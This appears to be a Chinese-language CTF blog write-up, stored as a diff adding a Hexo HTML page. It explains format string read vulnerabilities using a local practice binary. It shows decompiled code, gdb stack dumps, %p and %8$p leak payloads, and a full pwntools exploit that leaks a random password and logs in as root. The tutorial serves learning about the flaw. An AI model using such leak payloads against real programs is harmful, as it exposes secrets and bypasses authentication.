@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lxonz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="格式化字符串—读漏洞原理：格式化字符串漏洞常见的标志为printf(&amp;str)，其中str中的内容是可控的。printf在解析format参数时，会自动从栈上format字符串结束的位置，按顺序读取格式化字符串对应的参数。如图所示，执行的命令为printf(&quot;%s %d %d %d %x&quot;,buf, 1, 2, 3)，紧随格式化字串后压入栈上的参数为4个，但格式化字串有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串">
+<meta property="og:url" content="https://lxonz.github.io/2020/08/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/index.html">
+<meta property="og:site_name" content="lxonz&#39;Blog">
+<meta property="og:description" content="格式化字符串—读漏洞原理：格式化字符串漏洞常见的标志为printf(&amp;str)，其中str中的内容是可控的。printf在解析format参数时，会自动从栈上format字符串结束的位置，按顺序读取格式化字符串对应的参数。如图所示，执行的命令为printf(&quot;%s %d %d %d %x&quot;,buf, 1, 2, 3)，紧随格式化字串后压入栈上的参数为4个，但格式化字串有">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://lxonz.github.io/2020/08/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/tupian.jpg">
+<meta property="article:published_time" content="2020-08-29T19:29:11.000Z">
+<meta property="article:modified_time" content="2020-08-29T10:19:41.174Z">
+<meta property="article:author" content="lxonz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lxonz.github.io/2020/08/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/tupian.jpg">
+
+<link rel="canonical" href="https://lxonz.github.io/2020/08/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>格式化字符串 | lxonz'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lxonz'Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">pwn学习中</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">2</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/lxonz" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://lxonz.github.io/2020/08/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lxonz.png">
+      <meta itemprop="name" content="lxonz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lxonz'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          格式化字符串
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-30 03:29:11" itemprop="dateCreated datePublished" datetime="2020-08-30T03:29:11+08:00">2020-08-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-29 18:19:41" itemprop="dateModified" datetime="2020-08-29T18:19:41+08:00">2020-08-29</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="格式化字符串—读"><a href="#格式化字符串—读" class="headerlink" title="格式化字符串—读"></a>格式化字符串—读</h1><h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>格式化字符串漏洞常见的标志为<code>printf(&amp;str)</code>，其中<code>str</code>中的内容是可控的。<code>printf</code>在解析<code>format</code>参数时，会自动从栈上<code>format</code>字符串结束的位置，按顺序读取格式化字符串对应的参数。如图所示，执行的命令为<code>printf(&quot;%s %d %d %d %x&quot;,buf, 1, 2, 3)</code>，紧随格式化字串后压入栈上的参数为4个，但格式化字串有五个参数，<code>printf</code>在解析第五个参数<code>%x</code>时，会继续往栈上读取，造成了信息泄露：</p>
+<img src="/2020/08/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/tupian.jpg" class title="This is an test image">
+
+<a id="more"></a>
+
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><code>checksec</code>信息如下，保护全开：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/hjc18/PWN/stack_learn/fmt_stack/pwn1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p><code>IDA</code>中主函数逻辑如下：首先判断用户名是否为<code>root</code>，然后从系统中读取一个随机数，判断用户的输入与随机数是否相等。随机数输入的长度限制为<code>0x50</code>，告别了栈溢出的可能，随机数输入错误1次后<code>exit_flag</code>会置<code>0</code>，在下一次输入错误后程序会退出。唯一的利用点在于程序中存在<code>printf(&amp;s)</code>，而<code>s</code>是可控的，因此可以用过格式化字符串的任意地址读功能获取随机数：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000202098</span> exit_flag       db    <span class="number">1</span>    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+20h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+40h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_std();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hi, please input your name:&quot;</span>);</span><br><span class="line">  read_func(&amp;s1, <span class="number">16L</span>L);                         <span class="comment">// equal to read(buf,size)</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;root&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s welcome to go home !\n&quot;</span>, &amp;s1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oh, I also need your password:&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">      read_func(&amp;s, <span class="number">0x50</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s, &amp;buf) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your password &quot;</span>, &amp;buf);</span><br><span class="line">      <span class="built_in">printf</span>(&amp;s);                               <span class="comment">// vuln</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot; seem not ture......&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !exit_flag )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">      exit_flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are my root!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Who are you?&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>在输入中输入格式化字符串<code>%x</code>，程序会打印栈上的信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hi, please input your name:</span><br><span class="line">root</span><br><span class="line">root welcome to go home !</span><br><span class="line">Oh, I also need your password:</span><br><span class="line"><span class="meta">%</span><span class="bash">p %p %p %p %p %p %p %p %p</span></span><br><span class="line">Your password 0x7ffce2b24580 0x7f06e850d8c0 (nil) 0xe 0x7f06e828ef70 (nil) 0x300000000 0x6db2adca20d558ab (nil) seem not ture......</span><br><span class="line">Try again!</span><br></pre></td></tr></table></figure>
+
+<p>此时寄存器与栈的布局如下所示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"> #</span><span class="bash">reg</span></span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7f06e850d8c0 </span><br><span class="line"> RDI  0x7ffce2b26c60 -&gt; &#x27;%p %p %p %p %p %p %p %p %p&#x27;</span><br><span class="line"> RSI  0x7ffce2b24580 -&gt; &#x27;Your password o go home !\n&#x27;</span><br><span class="line"> R8   0xe</span><br><span class="line"> R9   0x7f06e828ef70</span><br><span class="line"> R10  0x3</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x565314ac6a30 </span><br><span class="line"> R13  0x7ffce2b26db0 </span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffce2b26cd0 </span><br><span class="line"> RSP  0x7ffce2b26c18 </span><br><span class="line"> RIP  0x7f06e8184f00 </span><br><span class="line"> </span><br><span class="line"><span class="meta"> #</span><span class="bash">stack</span></span><br><span class="line">rsp  0x7ffce2b26c18 -&gt; 0x565314ac6e0e</span><br><span class="line">     0x7ffce2b26c20 &lt;- 0x0</span><br><span class="line">     0x7ffce2b26c28 &lt;- 0x300000000</span><br><span class="line">     0x7ffce2b26c30 &lt;- 0x6db2adca20d558ab</span><br><span class="line">     0x7ffce2b26c38 &lt;- 0x0</span><br><span class="line">     0x7ffce2b26c40 &lt;- 0x746f6f72 /* &#x27;root&#x27; */</span><br><span class="line">     0x7ffce2b26c48 &lt;- 0x8000000000000006</span><br><span class="line">     0x7ffce2b26c50 &lt;- 0x0</span><br><span class="line">rdi  0x7ffce2b26c60 &lt;- &#x27;%p %p %p %p %p %p %p %p %p&#x27;</span><br><span class="line">     0x7ffce2b26c68 &lt;- &#x27; %p %p %p %p %p %p&#x27;</span><br><span class="line">     0x7ffce2b26c70 &lt;- &#x27;p %p %p %p&#x27;</span><br><span class="line">     0x7ffce2b26c78 &lt;- 0x7025 /* &#x27;%p&#x27; */</span><br><span class="line">     0x7ffce2b26c80 &lt;- 0x0</span><br><span class="line">     0x7ffce2b26cc0 &lt;-  0x7ffce2b26db0 </span><br><span class="line">     0x7ffce2b26cc8 &lt;- 0x9119a0b95845000</span><br><span class="line">rbp  0x7ffce2b26cd0 &lt;-  0x565314ac6e80 </span><br><span class="line">     0x7ffce2b26cd8 &lt;-  0x7f06e8141b97 </span><br></pre></td></tr></table></figure>
+
+<p>通过观察我们可以发现，泄露出来的数据依次为<code>RSI RDX RCX R8 R9 RSP+0x8 RSP+0x10 RSP+0x18</code>的内容，在64位系统中，函数前6个参数通过寄存器传参，对应<code>RSI</code> <del>RDI</del>  <code>RDX RCX R8 R9</code>，函数不会泄露<code>RDI</code>，即格式化字符串本身的地址内容。当寄存器的内容不足以填满格式化字符串的参数时，<code>printf</code>会继续往栈上索引，从<code>RSP+0x8</code>，即<code>main</code>函数的栈基址开始读取，刚好在第8个参数泄露了位于<code>rsp+10h</code>的随机数<code>0x6db2adca20d558ab</code>。</p>
+<p> 现在我们知道怎么计算偏移来读取任意地址的信息了，如果读取离当前<code>RSP</code>很远的信息，比如偏移了100个<code>%p</code>，可以使用<code>$</code>占位符减少输入，<code>$</code>的含义为输出对应位置的参数，比如<code>%8$p</code>输出第8个<code>%p</code>的数据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hi, please input your name:</span><br><span class="line">root</span><br><span class="line">root welcome to go home !</span><br><span class="line">Oh, I also need your password:</span><br><span class="line"><span class="meta">%</span><span class="bash">8<span class="variable">$p</span></span></span><br><span class="line">Your password 0x1d894b7f31fe7418 seem not ture......</span><br><span class="line">Try again!</span><br></pre></td></tr></table></figure>
+
+<p>再康康栈上的信息，刚好对应之前讲的第8个<code>%p</code>的输出内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rsp  0x7ffe0fbf9cf0 -&gt; 0x0</span><br><span class="line">     0x7ffe0fbf9cf8 -&gt; 0x300000000</span><br><span class="line">     0x7ffe0fbf9d00 -&gt; 0x1d894b7f31fe7418 //random</span><br><span class="line">     0x7ffe0fbf9d08 -&gt; 0x8000000000000006</span><br><span class="line">     0x7ffe0fbf9d10 -&gt; 0x746f6f72 /* &#x27;root&#x27; */</span><br><span class="line">     0x7ffe0fbf9d18 -&gt; 0x0</span><br></pre></td></tr></table></figure>
+
+<p><code>pwngbd</code>提供了一种方便的函数<code>fmtarg</code>，使用格式为<code>fmtarg addr</code>。在进入<code>printf</code>函数时断下，调用<code>fmtarg</code>后可以自动计算格式化参数与<code>addr</code>的偏移。<code>fmtarg</code>在计算<code>index</code>时将<code>RDI</code>也算了进去，后面会自动减一作为<code>%$p</code>的参数：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ins</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0x7f6507184f00 &lt;<span class="built_in">printf</span>&gt;        sub    rsp, 0xd8</span></span><br><span class="line">   0x7f6507184f07 &lt;printf+7&gt;      test   al, al</span><br><span class="line">   0x7f6507184f09 &lt;printf+9&gt;      mov    qword ptr [rsp + 0x28], rsi</span><br><span class="line">   </span><br><span class="line"><span class="meta">#</span><span class="bash"> stack</span></span><br><span class="line">rsp  0x7ffd014b4248 &lt;- 0x56029ee8ae0e </span><br><span class="line">     0x7ffd014b4250 -&gt; 0x0</span><br><span class="line">     0x7ffd014b4258 -&gt; 0x300000000</span><br><span class="line">     0x7ffd014b4260 -&gt; 0x869b15527cfcfffa//random</span><br><span class="line">     0x7ffd014b4268 -&gt; 0x0</span><br><span class="line">     0x7ffd014b4270 -&gt; 0x746f6f72 /* &#x27;root&#x27; */</span><br><span class="line">     0x7ffd014b4278 -&gt; 0x0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">use fmtarg -&gt; targrt:0x7ffd014b4260</span></span><br><span class="line">The index of format argument : 9 (&quot;\%8$p&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>现在我们已经可以泄露随机数，接下来利用思路就很简单了。第一轮利用格式化字符串漏洞读取随机数，第二轮直接将获取的随机数作为输入，即可“成为<code>root</code>”。完整<code>exp</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lauch_gdb</span>(<span class="params">p</span>):</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#lauch_gdb(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">rl = <span class="keyword">lambda</span> a=<span class="literal">False</span>              : p.recvline(a)    <span class="comment">#接收到\n，False表示丢弃\n</span></span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>             : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x                    : p.recvn(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x                    : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x                    : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b                  : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b                 : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>                     : p.interactive()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">cth = <span class="keyword">lambda</span> content,length      : int(content[:length],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;%8$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;password &#x27;</span>)</span><br><span class="line">content = ru(<span class="string">&#x27; seem&#x27;</span>)</span><br><span class="line">ans = int(cth(content,<span class="number">18</span>))</span><br><span class="line">rl()</span><br><span class="line">sla(<span class="string">&#x27;again!&#x27;</span>,p64(ans))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+
+<p>程序输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x1c bytes:</span><br><span class="line">    &#x27;Hi, please input your name:\n&#x27;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &#x27;root\n&#x27;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &#x27;root welcome to go home !\n&#x27;</span><br><span class="line">    &#x27;Oh, I also need your password:\n&#x27;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &#x27;%8$p\n&#x27;</span><br><span class="line">[DEBUG] Received 0x40 bytes:</span><br><span class="line">    &#x27;Your password 0x90b126967cc6caa3 seem not ture......\n&#x27;</span><br><span class="line">    &#x27;Try again!\n&#x27;</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    00000000  a3 ca c6 7c  96 26 b1 90  0a                        </span><br><span class="line">    00000009</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">[*] Process &#x27;./pwn1&#x27; stopped with exit code 0 (pid 11275)</span><br><span class="line">[DEBUG] Received 0x11 bytes:</span><br><span class="line">    &#x27;You are my root!\n&#x27;</span><br><span class="line">You are my root!</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>lxonz
+  </li>
+  <li class="post-copyright-link">
